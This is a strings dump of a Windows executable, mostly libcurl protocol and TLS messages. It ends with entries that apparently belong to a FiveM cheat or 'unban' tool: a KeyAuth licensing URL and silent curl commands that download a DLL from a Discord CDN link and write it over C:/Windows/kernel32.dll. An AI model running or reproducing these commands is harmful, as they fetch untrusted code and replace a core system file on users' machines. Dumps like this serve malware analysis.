+00072380	34	A	SOCKS5 reply has wrong version, version should be 5.
+000723b8	2c	A	Can't complete SOCKS5 connection to %s. (%d)
+00072408	0a	A	0123456789
+00072418	10	A	0123456789abcdef
+00072430	10	A	0123456789ABCDEF
+000728dc	06	A	Monday
+000728e8	07	A	Tuesday
+000728f0	09	A	Wednesday
+00072900	08	A	Thursday
+0007290c	06	A	Friday
+00072918	08	A	Saturday
+00072924	06	A	Sunday
+00072930	39	A	%31[ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
+00072970	10	A	%02d:%02d:%02d%n
+00072988	0b	A	%02d:%02d%n
+000729c0	10	A	0123456789abcdef
+00072aa0	08	A	schannel
+00072ab0	26	A	schannel: TLS 1.3 is not yet supported
+00072ad8	08	A	CALG_MD2
+00072ae8	08	A	CALG_MD4
+00072af8	08	A	CALG_MD5
+00072b08	08	A	CALG_SHA
+00072b18	09	A	CALG_SHA1
+00072b28	08	A	CALG_MAC
+00072b38	0d	A	CALG_RSA_SIGN
+00072b48	0d	A	CALG_DSS_SIGN
+00072b58	0c	A	CALG_NO_SIGN
+00072b68	0d	A	CALG_RSA_KEYX
+00072b78	08	A	CALG_DES
+00072b88	0d	A	CALG_3DES_112
+00072b98	09	A	CALG_3DES
+00072ba8	09	A	CALG_DESX
+00072bb8	08	A	CALG_RC2
+00072bc8	08	A	CALG_RC4
+00072bd8	09	A	CALG_SEAL
+00072be8	0a	A	CALG_DH_SF
+00072bf8	0d	A	CALG_DH_EPHEM
+00072c08	12	A	CALG_AGREEDKEY_ANY
+00072c20	0f	A	CALG_HUGHES_MD5
+00072c30	0d	A	CALG_SKIPJACK
+00072c40	08	A	CALG_TEK
+00072c50	0f	A	CALG_CYLINK_MEK
+00072c60	10	A	CALG_SSL3_SHAMD5
+00072c78	10	A	CALG_SSL3_MASTER
+00072c90	19	A	CALG_SCHANNEL_MASTER_HASH
+00072cb0	15	A	CALG_SCHANNEL_MAC_KEY
+00072cc8	15	A	CALG_SCHANNEL_ENC_KEY
+00072ce0	10	A	CALG_PCT1_MASTER
+00072cf8	10	A	CALG_SSL2_MASTER
+00072d10	10	A	CALG_TLS1_MASTER
+00072d28	08	A	CALG_RC5
+00072d38	09	A	CALG_HMAC
+00072d48	0c	A	CALG_TLS1PRF
+00072d58	15	A	CALG_HASH_REPLACE_OWF
+00072d70	0c	A	CALG_AES_128
+00072d80	0c	A	CALG_AES_192
+00072d90	0c	A	CALG_AES_256
+00072da0	08	A	CALG_AES
+00072db0	0c	A	CALG_SHA_256
+00072dc0	0c	A	CALG_SHA_384
+00072dd0	0c	A	CALG_SHA_512
+00072de0	09	A	CALG_ECDH
+00072df0	0a	A	CALG_ECMQV
+00072e00	0a	A	CALG_ECDSA
+00072e10	0f	A	CALG_ECDH_EPHEM
+00072e20	0b	A	CurrentUser
+00072e30	0c	A	LocalMachine
+00072e40	0e	A	CurrentService
+00072e50	08	A	Services
+00072e5c	05	A	Users
+00072e68	16	A	CurrentUserGroupPolicy
+00072e80	17	A	LocalMachineGroupPolicy
+00072e98	16	A	LocalMachineEnterprise
+00072f28	10	A	wine_get_version
+00072f3c	05	A	ntdll
+00072f50	64	A	schannel: this version of Windows is too old to support certificate verification via CA bundle file.
+00072fb8	34	A	Unrecognized parameter passed via CURLOPT_SSLVERSION
+00072ff0	33	A	Unable to set ciphers to passed via SSL_CONN_CONFIG
+00073028	3b	A	schannel: Failed to get certificate location or file for %s
+00073068	25	A	schannel: Failed to read cert file %s
+00073090	38	A	schannel: Failed to import cert file %s, password is bad
+000730d0	3b	A	schannel: Failed to import cert file %s, last error is 0x%x
+00073110	44	A	schannel: Failed to get certificate from file %s, last error is 0x%x
+00073158	3d	A	schannel: Failed to open cert store %x %s, last error is 0x%x
+00073198	23	A	schannel: unable to allocate memory
+000731c0	2c	A	Microsoft Unified Security Protocol Provider
+000731f0	2d	A	schannel: AcquireCredentialsHandle failed: %s
+00073260	08	A	http/1.1
+00073290	36	A	schannel: initial InitializeSecurityContext failed: %s
+000732c8	2d	A	schannel: SNI or certificate check failed: %s
+00073300	46	A	schannel: failed to send initial handshake data: sent %zd of %lu bytes
+00073348	26	A	schannel: unable to re-allocate memory
+00073370	40	A	schannel: failed to receive handshake, SSL/TLS connection failed
+000733c0	43	A	schannel: failed to send next handshake data: sent %zd of %lu bytes
+00073408	33	A	schannel: next InitializeSecurityContext failed: %s
+00073440	31	A	SSL: public key does not match pinned public key!
+00073478	2c	A	schannel: failed to setup sequence detection
+000734a8	2a	A	schannel: failed to setup replay detection
+000734d8	29	A	schannel: failed to setup confidentiality
+00073508	2b	A	schannel: failed to setup memory allocation
+00073538	2c	A	schannel: failed to setup stream orientation
+00073568	28	A	schannel: failed to retrieve ALPN result
+000735f8	2b	A	schannel: failed to store credential handle
+00073628	30	A	schannel: failed to retrieve remote cert context
+00073660	1a	A	SSL/TLS connection timeout
+00073680	28	A	select/poll on SSL/TLS socket, errno: %d
+000736b0	32	A	schannel: timed out sending data (bytes sent: %zd)
+000736e8	24	A	select/poll on SSL socket, errno: %d
+00073a58	27	A	schannel: ApplyControlToken failure: %s
+00073ac0	08	A	Schannel
+00073ad0	37	A	schannel: Failed to read remote certificate context: %s
+00073b08	39	A	SSL: failed retrieving public key from server certificate
+00073b90	40	A	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+00073be0	40	A	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_
+00073c24	06	A	%c%c==
+00073c30	07	A	%c%c%c=
+00073c38	08	A	%c%c%c%c
+00073da0	05	A	IMAPS
+00073db0	0a	A	CAPABILITY
+00073dc4	05	A	STORE
+00073dcc	05	A	FETCH
+00073dd4	06	A	SELECT
+00073de0	07	A	EXAMINE
+00073de8	06	A	SEARCH
+00073df0	07	A	EXPUNGE
+00073e10	20	A	Unexpected continuation response
+00073e38	08	A	STARTTLS
+00073e48	0b	A	LOGIN %s %s
+00073e58	12	A	AUTHENTICATE %s %s
+00073e70	0f	A	AUTHENTICATE %s
+00073eb8	0b	A	LIST "%s" *
+00073ec8	20	A	Cannot SELECT without a mailbox.
+00073ef0	09	A	SELECT %s
+00073f00	19	A	UID FETCH %s BODY[%s]<%s>
+00073f20	15	A	UID FETCH %s BODY[%s]
+00073f38	15	A	FETCH %s BODY[%s]<%s>
+00073f50	11	A	FETCH %s BODY[%s]
+00073f68	1b	A	Cannot FETCH without a UID.
+00073f88	20	A	Cannot APPEND without a mailbox.
+00073fb0	0c	A	Mime-Version
+00073fc0	11	A	Mime-Version: 1.0
+00074008	19	A	APPEND %s (\Seen) {%I64d}
+00074028	25	A	Cannot SEARCH without a query string.
+00074050	09	A	SEARCH %s
+0007405c	06	A	LOGOUT
+00074098	23	A	Got unexpected imap-server response
+000740bc	05	A	AUTH=
+000740c8	17	A	STARTTLS not supported.
+000740e0	0f	A	STARTTLS denied
+000740f0	18	A	Authentication cancelled
+00074110	11	A	Access denied. %c
+00074128	20	A	OK [UIDVALIDITY %19[0123456789]]
+00074150	1f	A	Mailbox UIDVALIDITY has changed
+00074170	0d	A	Select failed
+000741d8	1f	A	Failed to parse FETCH response.
+000741f8	06	A	%c%03d
+00074200	05	A	%s %s
+00074208	0b	A	UIDVALIDITY
+00074218	09	A	MAILINDEX
+00074228	07	A	SECTION
+00074230	07	A	PARTIAL
+00074390	05	A	POP3S
+000743b0	07	A	USER %s
+000743c0	0a	A	APOP %s %s
+000743d0	0a	A	AUTH %s %s
+000743e0	07	A	AUTH %s
+000743f8	23	A	Got unexpected pop3-server response
+00074420	13	A	STLS not supported.
+00074438	19	A	Authentication failed: %d
+00074458	07	A	PASS %s
+00074460	05	A	+APOP
+000745c0	05	A	SMTPS
+000745d0	07	A	EHLO %s
+000745d8	07	A	HELO %s
+000745e0	09	A	 SMTPUTF8
+000745f0	0d	A	VRFY %s%s%s%s
+00074608	07	A	%s %s%s
+00074618	07	A	<%s@%s>
+0007462c	05	A	%I64d
+00074634	06	A	 SIZE=
+0007463c	06	A	 AUTH=
+00074648	16	A	MAIL FROM:%s%s%s%s%s%s
+00074660	0f	A	RCPT TO:<%s@%s>
+00074670	0c	A	RCPT TO:<%s>
+00074680	27	A	Got unexpected smtp-server response: %d
+000746a8	18	A	STARTTLS denied, code %d
+000746c8	18	A	Remote access denied: %d
+000746e8	20	A	Unexpectedly short EHLO response
+00074710	12	A	Command failed: %d
+00074728	0f	A	MAIL failed: %d
+00074738	0f	A	RCPT failed: %d
+00074748	1c	A	RCPT failed: %d (last error)
+00074770	0f	A	DATA failed: %d
+000748e0	20	A	Error accept()ing server connect
+00074950	34	A	Accept timeout occurred while waiting server connect
+000749c0	26	A	Error while waiting for server connect
+00074ac8	14	A	FTP response timeout
+00074ae0	31	A	FTP response aborted due to select/poll error: %d
+00074b18	06	A	CWD %s
+00074b20	18	A	getsockname() failed: %s
+00074b40	32	A	failed to resolve the address provided to PORT: %s
+00074b78	12	A	socket failure: %s
+00074bc0	19	A	bind(port=%hu) failed: %s
+00074be0	23	A	bind() failed, we ran out of ports!
+00074c08	0e	A	%s |%d|%s|%hu|
+00074c18	20	A	Failure sending EPRT command: %s
+00074c3c	06	A	,%d,%d
+00074c48	20	A	Failure sending PORT command: %s
+00074c98	07	A	PRET %s
+00074ca0	0c	A	PRET STOR %s
+00074cb0	0c	A	PRET RETR %s
+00074cc0	07	A	REST %d
+00074cc8	07	A	SIZE %s
+00074cd0	07	A	MDTM %s
+00074cd8	13	A	Failed to read data
+00074d18	07	A	APPE %s
+00074d20	07	A	STOR %s
+00074d28	07	A	RETR %s
+00074d80	0a	A	%c%c%c%u%c
+00074d90	21	A	Illegal port number in EPSV reply
+00074db8	1c	A	Weirdly formatted EPSV reply
+00074dd8	11	A	%u,%u,%u,%u,%u,%u
+00074df0	23	A	Couldn't interpret the 227-response
+00074e58	0b	A	%u.%u.%u.%u
+00074e68	1c	A	Bad PASV/EPSV response: %03d
+00074e88	1f	A	Can't resolve proxy host %s:%hu
+00074ea8	1d	A	Can't resolve new host %s:%hu
+00074ee0	11	A	Failed to do PORT
+00074f18	18	A	%04d%02d%02d%02d%02d%02d
+00074f38	1f	A	%04d%02d%02d %02d:%02d:%02d GMT
+00074fb0	19	A	Given file does not exist
+00074ff0	19	A	Couldn't set desired mode
+00075070	2b	A	Offset (%I64d) was beyond file size (%I64d)
+000750f8	0a	A	REST %I64d
+00075120	11	A	Couldn't use REST
+00075138	16	A	Failed FTP upload: %0d
+0007517c	06	A	 bytes
+000751c0	13	A	RETR response: %03d
+000751d8	07	A	PBSZ %d
+000751e0	07	A	ACCT %s
+000751e8	21	A	ACCT requested but none available
+00075210	13	A	Access denied: %03d
+00075228	1d	A	ACCT rejected by server: %03d
+00075248	34	A	Got a %03d ftp-server response when 220 was expected
+00075280	2f	A	unsupported parameter to CURLOPT_FTPSSLAUTH: %d
+000752b0	07	A	PROT %c
+000752c0	29	A	Failed to clear the command channel (CCC)
+0007532c	06	A	OS/400
+00075338	0e	A	SITE NAMEFMT 1
+00075348	1d	A	QUOT command failed with %03d
+00075368	06	A	MKD %s
+00075370	32	A	Server denied you to change to the given directory
+000753a8	17	A	Failed to MKD dir: %03d
+000753c0	1f	A	PRET command not accepted: %03d
+00075408	20	A	Failure sending ABOR command: %s
+00075430	1d	A	control connection looks dead
+00075480	20	A	server did not report OK, got %d
+000754a8	37	A	Uploaded unaligned file size (%I64d out of %I64d bytes)
+000754e0	27	A	Received only partial file: %I64d bytes
+00075508	15	A	No data was received!
+00075520	1c	A	QUOT string not accepted: %s
+00075540	07	A	TYPE %c
+000755f8	20	A	Failure sending QUIT command: %s
+00075620	27	A	Uploading to a URL without a file name!
+00075710	15	A	Couldn't open file %s
+00075728	19	A	Can't open %s for writing
+00075748	18	A	Can't get the size of %s
+000757a0	1b	A	Can't get the size of file.
+000757c0	21	A	failed to resume file:// transfer
+00075880	3b	A	The CSeq of this request %ld did not match the response %ld
+000758e8	18	A	Got invalid RTSP request
+00075908	08	A	DESCRIBE
+00075918	08	A	ANNOUNCE
+00075924	05	A	SETUP
+00075934	05	A	PAUSE
+00075940	08	A	TEARDOWN
+00075950	0d	A	GET_PARAMETER
+00075960	0d	A	SET_PARAMETER
+00075970	06	A	RECORD
+00075978	26	A	Got invalid RTSP request: RTSPREQ_LAST
+000759a0	3c	A	Refusing to issue an RTSP request [%s] without a session ID.
+000759e0	09	A	Transport
+00075a00	3c	A	Refusing to issue an RTSP SETUP without a Transport: header.
+00075a78	26	A	CSeq cannot be set as a custom header.
+00075aa0	07	A	Session
+00075aa8	2c	A	Session ID cannot be set as a custom header.
+00075b08	10	A	%s%s%s%s%s%s%s%s
+00075b60	1b	A	Failed sending RTSP request
+00075b80	22	A	Got an error writing an RTP packet
+00075ba8	10	A	Cannot pause RTP
+00075bc0	17	A	Failed writing RTP data
+00075bd8	05	A	CSeq:
+00075be0	05	A	: %ld
+00075be8	24	A	Unable to read the CSeq header: [%s]
+00075c10	08	A	Session:
+00075c20	16	A	Got a blank Session ID
+00075c38	31	A	Got RTSP Session ID Line [%s], but wanted ID [%s]
+00075d9c	0a	A	NT LM 0.12
+00075da8	0f	A	x86_64-pc-win32
+00075dc4	05	A	?????
+00075dd0	14	A	Invalid input packet
+00075e80	07	A	/MATCH:
+00075e8c	06	A	/FIND:
+00075eb0	07	A	default
+00075ef0	1b	A	Failed sending DICT request
+00075f10	08	A	/DEFINE:
+00075f20	08	A	/LOOKUP:
+00076200	06	A	BINARY
+00076218	11	A	SUPPRESS GO AHEAD
+00076234	06	A	STATUS
+00076240	0b	A	TIMING MARK
+00076264	06	A	NAOCRD
+0007626c	06	A	NAOHTS
+00076274	06	A	NAOHTD
+0007627c	06	A	NAOFFD
+00076284	06	A	NAOVTS
+0007628c	06	A	NAOVTD
+00076294	06	A	NAOLFD
+000762a0	0c	A	EXTEND ASCII
+000762b0	0a	A	BYTE MACRO
+000762c0	0b	A	DE TERMINAL
+000762cc	06	A	SUPDUP
+000762d8	0d	A	SUPDUP OUTPUT
+000762e8	0d	A	SEND LOCATION
+000762f8	09	A	TERM TYPE
+00076308	0d	A	END OF RECORD
+00076318	0a	A	TACACS UID
+00076328	0e	A	OUTPUT MARKING
+00076338	06	A	TTYLOC
+00076340	0b	A	3270 REGIME
+0007634c	06	A	X3 PAD
+00076360	0a	A	TERM SPEED
+0007636c	05	A	LFLOW
+00076378	08	A	LINEMODE
+00076388	08	A	XDISPLOC
+00076398	0b	A	OLD-ENVIRON
+000763a8	0e	A	AUTHENTICATION
+000763b8	07	A	ENCRYPT
+000763c0	0b	A	NEW-ENVIRON
+000763d8	05	A	ABORT
+000763ec	05	A	DMARK
+00076434	06	A	TELNET
+00076440	16	A	WSAStartup failed (%d)
+00076458	2e	A	insufficient winsock version to support telnet
+000764a4	05	A	EXOPL
+000764e0	18	A	Sending data failed (%d)
+00076510	0a	A	%s IAC SB 
+00076520	0f	A	(terminated by 
+00076538	0f	A	, not IAC SE!) 
+00076548	12	A	(Empty suboption?)
+00076560	10	A	%s (unsupported)
+00076578	0c	A	%d (unknown)
+00076588	16	A	Width: %d ; Height: %d
+000765a4	05	A	 SEND
+000765b0	0b	A	 INFO/REPLY
+000765bc	05	A	 NAME
+000765c4	05	A	 "%s"
+000765d4	05	A	 %.2x
+000765e0	07	A	USER,%s
+000765e8	14	A	%127[^= ]%*[ =]%255s
+00076600	05	A	TTYPE
+00076608	07	A	NEW_ENV
+00076618	0c	A	%hu%*[xX]%hu
+00076628	21	A	Syntax error in telnet option: %s
+00076650	18	A	Unknown telnet option %s
+00076670	0e	A	%c%c%c%c%s%c%c
+00076680	0e	A	%127[^,],%127s
+00076690	08	A	%c%s%c%s
+000766a8	1d	A	In SUBOPTION processing, RCVD
+000766c8	0a	A	WS2_32.DLL
+000766d8	1e	A	failed to load WS2_32.DLL (%u)
+000766f8	0e	A	WSACreateEvent
+00076708	2b	A	failed to find WSACreateEvent function (%u)
+00076738	0d	A	WSACloseEvent
+00076748	2a	A	failed to find WSACloseEvent function (%u)
+00076778	0e	A	WSAEventSelect
+00076788	2b	A	failed to find WSAEventSelect function (%u)
+000767b8	14	A	WSAEnumNetworkEvents
+000767d0	31	A	failed to find WSAEnumNetworkEvents function (%u)
+00076808	1a	A	WSACreateEvent failed (%d)
+00076828	20	A	WSAEnumNetworkEvents failed (%d)
+00076850	08	A	Time-out
+00076860	19	A	WSACloseEvent failed (%d)
+00076880	1f	A	FreeLibrary(wsock2) failed (%u)
+00076970	1f	A	Malformed ACK packet, rejecting
+000769b0	07	A	blksize
+000769b8	26	A	invalid blocksize value in OACK packet
+000769e0	24	A	blksize is larger than max supported
+00076a08	07	A	%s (%d)
+00076a10	25	A	blksize is smaller than min supported
+00076a38	2e	A	server requested blksize larger than allocated
+00076a68	08	A	%s (%ld)
+00076a78	09	A	requested
+00076a88	18	A	blksize parsed from OACK
+00076abc	05	A	tsize
+00076ac8	16	A	tsize parsed from OACK
+00076af0	29	A	invalid tsize -:%s:- value in OACK packet
+00076b20	16	A	Connected for transmit
+00076b38	15	A	Connected for receive
+00076b50	05	A	octet
+00076b58	08	A	netascii
+00076b88	08	A	%s%c%s%c
+00076b98	07	A	timeout
+00076ba0	21	A	TFTP buffer too small for options
+00076bc8	1f	A	tftp_send_first: internal error
+00076c90	17	A	tftp_rx: internal error
+00076cd8	2b	A	tftp_tx: giving up waiting for block %d ack
+00076d08	22	A	tftp_tx: internal error, event: %i
+00076d30	0d	A	TFTP finished
+00076d40	1c	A	Internal state machine error
+00076d60	11	A	bind() failed; %s
+00076d78	19	A	Received too short packet
+00076da8	21	A	Internal error: Unexpected packet
+00076dd0	15	A	TFTP response timeout
+00076de8	06	A	;mode=
+00076f10	05	A	LDAPS
+00076f18	16	A	Microsoft Corporation.
+00076f78	0e	A	LDAP local: %s
+00076f88	09	A	encrypted
+00076f98	09	A	cleartext
+00076fd8	24	A	LDAP local: Cannot connect to %s:%ld
+00077000	25	A	LDAP local: bind via ldap_win_bind %s
+00077028	0f	A	LDAP remote: %s
+00077040	07	A	;binary
+00077070	07	A	onetree
+00077088	07	A	subtree
+00077128	06	A	GOPHER
+00077130	1d	A	Failed sending Gopher request
+00077163	0d	A	
+00077178	06	A	%%%02x
+00077180	23	A	[%*45[0123456789abcdefABCDEF:.]%c%n
+000771a8	0a	A	%*[^]]%c%n
+000771b8	18	A	0123456789abcdefABCDEF:.
+000771d8	0a	A	localhost/
+000771e8	0a	A	127.0.0.1/
+000771fc	05	A	dict.
+0007720c	05	A	ldap.
+0007721c	05	A	imap.
+00077224	05	A	smtp.
+0007722c	05	A	pop3.
+00077240	0d	A	file://%s%s%s
+00077250	07	A	%%25%s]
+00077260	23	A	%s://%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+00077288	07	A	machine
+00077290	05	A	login
+00077298	08	A	password
+000772b0	0a	A	%s%s.netrc
+000772c0	0a	A	%s%s_netrc
+000772f0	4d	A	Curl_output_negotiate, no persistent authentication: cleanup existing context
+000773e8	0b	A	%d.%d.%d.%d
+000773f8	07	A	WDigest
+00077438	05	A	realm
+00077440	05	A	stale
+00077488	0c	A	security.dll
+00077498	0b	A	secur32.dll
+000774a8	16	A	InitSecurityInterfaceA
+000774c0	1b	A	Too long hexadecimal number
+000774e0	27	A	Illegal or missing hexadecimal sequence
+00077508	18	A	Malformed encoding found
+00077528	1a	A	Bad content-encoding found
+000775b8	09	A	Bad label
+000775c8	0c	A	Out of range
+000775d8	0a	A	Label loop
+000775e8	09	A	Too small
+000775f8	0c	A	RDATA length
+00077608	09	A	Malformat
+00077618	09	A	Bad RCODE
+00077628	0f	A	Unexpected TYPE
+00077638	10	A	Unexpected CLASS
+00077650	0a	A	No content
+0007765c	06	A	Bad ID
+00077668	0e	A	bad error code
+000776d8	09	A	%s?dns=%s
+000776e8	25	A	Content-Type: application/dns-message
+00077740	0a	A	DOH AAAA: 
+00077750	0a	A	%s%02x%02x
+00077778	19	A	Could not DOH-resolve: %s
+00077868	24	A	InitializeSecurityContext failed: %s
+00077890	1c	A	CompleteAuthToken failed: %s
+000778b0	19	A	SSPI error: %s failed: %s
+000778d4	05	A	%s/%s
+000778e0	08	A	Kerberos
+000778f0	18	A	AcquireCredentialsHandle
+00077910	1e	A	Failed to acquire credentials.
+00077930	19	A	InitializeSecurityContext
+00077950	26	A	Failed to initialise security context.
+00077978	2b	A	Failed to send SSPI authentication request.
+000779a8	29	A	Failed to send SSPI authentication token.
+000779d8	2f	A	Failed to receive SSPI authentication response.
+00077a08	2f	A	User was rejected by the SOCKS5 server (%u %u).
+00077a38	32	A	Invalid SSPI authentication response type (%u %u).
+00077a70	2c	A	Failed to receive SSPI authentication token.
+00077aa0	19	A	QueryCredentialAttributes
+00077ac0	1e	A	Failed to determine user name.
+00077b18	09	A	integrity
+00077b28	0f	A	confidentiality
+00077b70	16	A	QueryContextAttributes
+00077b88	2c	A	Failed to query security context attributes.
+00077bb8	0e	A	EncryptMessage
+00077bc8	27	A	Failed to send SSPI encryption request.
+00077bf0	24	A	Failed to send SSPI encryption type.
+00077c18	2b	A	Failed to receive SSPI encryption response.
+00077c48	2e	A	Invalid SSPI encryption response type (%u %u).
+00077c78	27	A	Failed to receive SSPI encryption type.
+00077ca0	0e	A	DecryptMessage
+00077cb0	2e	A	Invalid SSPI encryption response length (%lu).
+00077ce0	10	A	out GSS-API data
+00077cf8	12	A	 GSS-API integrity
+00077d10	18	A	 GSS-API confidentiality
+00077d60	30	A	schannel: invalid path name for CA file '%s': %s
+00077d98	29	A	schannel: failed to open CA file '%s': %s
+00077dc8	36	A	schannel: failed to determine size of CA file '%s': %s
+00077e00	2e	A	schannel: CA file exceeds max size of %u bytes
+00077e30	2e	A	schannel: failed to read from CA file '%s': %s
+00077e60	1b	A	-----BEGIN CERTIFICATE-----
+00077e81	19	A	-----END CERTIFICATE-----
+00077ea0	31	A	schannel: CA file '%s' is not correctly formatted
+00077ed8	3d	A	schannel: failed to extract certificate from CA file '%s': %s
+00077f20	54	A	schannel: unexpected content type '%d' when extracting certificate from CA file '%s'
+00077f80	4e	A	schannel: failed to add certificate from CA file '%s' to certificate store: %s
+00078048	23	A	schannel: Null certificate context.
+00078070	20	A	schannel: Null certificate info.
+00078098	09	A	2.5.29.17
+000780a8	34	A	schannel: CertFindExtension() returned no extension.
+000780e0	47	A	schannel: CryptDecodeObjectEx() returned no alternate name information.
+00078128	19	A	schannel: Empty DNS name.
+00078148	33	A	schannel: Not enough memory to list all host names.
+00078180	46	A	schannel: CertGetNameString() returned no certificate name information
+000781d0	56	A	schannel: CertGetNameString() returned certificate name information of unexpected size
+000782d0	67	A	schannel: CertGetNameString() failed to match connection hostname (%s) against server certificate names
+00078338	35	A	schannel: server certificate name verification failed
+00078370	30	A	schannel: failed to create certificate store: %s
+000783a8	37	A	schannel: failed to create certificate chain engine: %s
+000783e0	2c	A	schannel: CertGetCertificateChain failed: %s
+00078410	43	A	schannel: CertGetCertificateChain trust error CERT_TRUST_IS_REVOKED
+00078460	49	A	schannel: CertGetCertificateChain trust error CERT_TRUST_IS_PARTIAL_CHAIN
+000784b0	4a	A	schannel: CertGetCertificateChain trust error CERT_TRUST_IS_UNTRUSTED_ROOT
+00078500	4a	A	schannel: CertGetCertificateChain trust error CERT_TRUST_IS_NOT_TIME_VALID
+00078550	52	A	schannel: CertGetCertificateChain trust error CERT_TRUST_REVOCATION_STATUS_UNKNOWN
+000785a8	34	A	schannel: CertGetCertificateChain error mask: 0x%08x
+000785e0	07	A	2.5.4.3
+000785e8	09	A	2.5.29.17
+000788f0	11	A	1.2.840.10040.4.1
+00078908	11	A	1.2.840.10040.4.3
+00078920	0d	A	dsa-with-sha1
+00078930	11	A	1.2.840.10045.2.1
+00078948	0b	A	ecPublicKey
+00078958	13	A	1.2.840.10045.3.0.1
+00078970	0a	A	c2pnb163v1
+00078980	11	A	1.2.840.10045.4.1
+00078998	0f	A	ecdsa-with-SHA1
+000789a8	11	A	1.2.840.10046.2.1
+000789c0	0e	A	dhpublicnumber
+000789d0	14	A	1.2.840.113549.1.1.1
+000789e8	0d	A	rsaEncryption
+000789f8	14	A	1.2.840.113549.1.1.2
+00078a10	14	A	md2WithRSAEncryption
+00078a28	14	A	1.2.840.113549.1.1.4
+00078a40	14	A	md5WithRSAEncryption
+00078a58	14	A	1.2.840.113549.1.1.5
+00078a70	15	A	sha1WithRSAEncryption
+00078a88	15	A	1.2.840.113549.1.1.10
+00078aa0	0a	A	RSASSA-PSS
+00078ab0	15	A	1.2.840.113549.1.1.14
+00078ac8	17	A	sha224WithRSAEncryption
+00078ae0	15	A	1.2.840.113549.1.1.11
+00078af8	17	A	sha256WithRSAEncryption
+00078b10	15	A	1.2.840.113549.1.1.12
+00078b28	17	A	sha384WithRSAEncryption
+00078b40	15	A	1.2.840.113549.1.1.13
+00078b58	17	A	sha512WithRSAEncryption
+00078b70	12	A	1.2.840.113549.2.2
+00078b88	12	A	1.2.840.113549.2.5
+00078ba0	0d	A	1.3.14.3.2.26
+00078bc0	07	A	2.5.4.4
+00078bd0	07	A	2.5.4.5
+00078bd8	0c	A	serialNumber
+00078be8	07	A	2.5.4.6
+00078bf8	07	A	2.5.4.7
+00078c08	07	A	2.5.4.8
+00078c18	07	A	2.5.4.9
+00078c20	0d	A	streetAddress
+00078c30	08	A	2.5.4.10
+00078c40	08	A	2.5.4.11
+00078c50	08	A	2.5.4.12
+00078c5c	05	A	title
+00078c68	08	A	2.5.4.13
+00078c78	0b	A	description
+00078c88	08	A	2.5.4.17
+00078c98	0a	A	postalCode
+00078ca8	08	A	2.5.4.41
+00078cc0	08	A	2.5.4.42
+00078cd0	09	A	givenName
+00078ce0	08	A	2.5.4.43
+00078cf0	08	A	initials
+00078d00	08	A	2.5.4.44
+00078d10	13	A	generationQualifier
+00078d28	08	A	2.5.4.45
+00078d38	14	A	X500UniqueIdentifier
+00078d50	08	A	2.5.4.46
+00078d60	0b	A	dnQualifier
+00078d70	08	A	2.5.4.65
+00078d80	09	A	pseudonym
+00078d90	14	A	1.2.840.113549.1.9.1
+00078da8	0c	A	emailAddress
+00078db8	08	A	2.5.4.72
+00078dd0	0e	A	subjectAltName
+00078de0	09	A	2.5.29.18
+00078df0	0d	A	issuerAltName
+00078e00	09	A	2.5.29.19
+00078e10	10	A	basicConstraints
+00078e28	16	A	2.16.840.1.101.3.4.2.4
+00078e40	06	A	sha224
+00078e48	16	A	2.16.840.1.101.3.4.2.1
+00078e60	06	A	sha256
+00078e68	16	A	2.16.840.1.101.3.4.2.2
+00078e80	06	A	sha384
+00078e88	16	A	2.16.840.1.101.3.4.2.3
+00078ea0	06	A	sha512
+00078ea8	05	A	%02x:
+00078eb4	05	A	%s%lx
+00078ec8	29	A	%.4s-%.2s-%.2s %.2s:%.2s:%c%c%s%.*s%s%.*s
+00078f00	24	A	%u%.2s-%.2s-%.2s %.2s:%.2s:%.2s %.*s
+00078f60	0e	A	RSA Public Key
+00078f70	06	A	rsa(n)
+00078f78	06	A	rsa(e)
+00078f80	06	A	dsa(p)
+00078f88	06	A	dsa(q)
+00078f90	06	A	dsa(g)
+00078f98	0c	A	dsa(pub_key)
+00078fa8	05	A	dh(p)
+00078fb0	05	A	dh(g)
+00078fb8	0b	A	dh(pub_key)
+00078fc8	07	A	Subject
+00078fe4	06	A	Issuer
+00079000	07	A	Version
+00079028	0d	A	Serial Number
+00079050	13	A	Signature Algorithm
+00079088	0a	A	Start Date
+000790b0	0b	A	Expire Date
+000790d8	14	A	Public Key Algorithm
+00079110	09	A	Signature
+00079138	19	A	-----END CERTIFICATE-----
+00079160	17	A	server response timeout
+00079178	11	A	select/poll error
+00079190	26	A	cached response data too big to handle
+000791b8	17	A	response reading failed
+00079310	05	A	LOGIN
+00079318	05	A	PLAIN
+00079320	08	A	CRAM-MD5
+00079330	0a	A	DIGEST-MD5
+0007933c	06	A	GSSAPI
+00079348	08	A	EXTERNAL
+00079358	07	A	XOAUTH2
+00079360	0b	A	OAUTHBEARER
+00079378	29	A	Unsupported SASL authentication mechanism
+000793ac	06	A	total 
+000793b8	08	A	rwx-tTsS
+000793c8	0b	A	0123456789-
+000793d8	0e	A	APM0123456789:
+000793e8	05	A	<DIR>
+000793f0	0a	A	KGS!@#$%./
+00079420	43	A	%s %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x
+000795bc	05	A	digit
+000795c4	05	A	alnum
+000795cc	05	A	alpha
+000795d4	06	A	xdigit
+000795dc	05	A	print
+000795e4	05	A	graph
+000795ec	05	A	space
+000795f4	05	A	blank
+000795fc	05	A	upper
+00079604	05	A	lower
+00079630	20	U	api-ms-win-core-synch-l1-2-0.dll
+00079678	0c	U	kernel32.dll
+00079698	18	A	SleepConditionVariableCS
+000796b8	18	A	WakeAllConditionVariable
+000796e8	0e	A	bad allocation
+00079798	11	A	Unknown exception
+000797b0	14	A	bad array new length
+000797c8	0f	A	string too long
+000797d8	08	A	bad cast
+000797e8	0d	A	Galaxy Woofer
+000797f8	0a	A	oVgAULGd6v
+00079810	40	A	485c41282457e9be906a22d6eb557335e6493d2a3ecaff7cd3df02b407289941
+00079858	1c	A	https://keyauth.win/api/1.2/
+00079880	88	A	curl https://cdn.discordapp.com/attachments/1011760526113652749/1037723447851237397/unban.dll --output C:/Windows/kernel32.dll >nul 2>&1
+00079910	b3	A	curl https://cdn.discordapp.com/attachments/1017921832357208114/1037708136829681754/CitizenFX.ini --output C:/Users/%USERNAME/AppData/Local/FiveM/FiveM.app/CitizenFX.ini >nul 2>&1
+000799c8	17	A	C:\Windows\kernel32.dll
